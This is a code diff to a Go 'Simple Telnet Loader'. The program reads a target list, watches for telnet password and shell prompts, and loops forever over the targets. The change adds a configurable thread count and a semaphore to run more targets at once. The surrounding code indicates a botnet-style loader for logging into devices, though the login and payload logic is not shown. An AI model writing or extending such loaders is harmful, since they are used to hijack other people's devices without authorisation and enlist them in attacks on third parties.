@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -21,32 +22,39 @@ var passwordPrompts = []string{"Password:", "password:", "passwd:", "Pass:"}
 var shellPrompts = []string{"#", "$", ">", "~", "%", "@"}
 
 var (
-	successCounter = 0
+	successCounter int
 	mu             sync.Mutex
 	wg             sync.WaitGroup
 )
 
 func main() {
-	if len(os.Args) != 2 {
-		fmt.Println("Usage: ./loader <target_file>")
+	if len(os.Args) != 3 {
+		fmt.Println("Usage: ./loader <target_file> <threads>")
 		return
 	}
 
 	targetFile := os.Args[1]
-	printBanner(targetFile)
+	threadCount, err := strconv.Atoi(os.Args[2])
+	if err != nil || threadCount < 1 {
+		fmt.Println("Invalid thread count")
+		return
+	}
+
+	printBanner(targetFile, threadCount)
 
 	for {
-		runOnce(targetFile)
+		runOnce(targetFile, threadCount)
 	}
 }
 
-func printBanner(filename string) {
+func printBanner(filename string, threads int) {
 	targetCount := countLines(filename)
 	fmt.Println("======================================")
 	fmt.Println("     Simple Telnet Loader (Go)        ")
 	fmt.Println("======================================")
 	fmt.Printf("File       : %s\n", filename)
 	fmt.Printf("Loaded     : %d targets\n", targetCount)
+	fmt.Printf("Threads    : %d\n", threads)
 	fmt.Printf("Start Time : %s\n", time.Now().Format("2006-01-02 15:04:05"))
 	fmt.Println("======================================\n")
 }
@@ -69,7 +77,7 @@ func countLines(filename string) int {
 	return count
 }
 
-func runOnce(filename string) {
+func runOnce(filename string, maxThreads int) {
 	file, err := os.Open(filename)
 	if err != nil {
 		fmt.Println("Failed to open file:", err)
@@ -77,14 +85,17 @@ func runOnce(filename string) {
 	}
 	defer file.Close()
 
+	sem := make(chan struct{}, maxThreads)
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
 		line := strings.TrimSpace(scanner.Text())
 		if line != "" && !strings.HasPrefix(line, "#") {
+			sem <- struct{}{}
 			wg.Add(1)
 			go func(line string) {
 				defer wg.Done()
 				handleTarget(line)
+				<-sem
 			}(line)
 		}
 	}
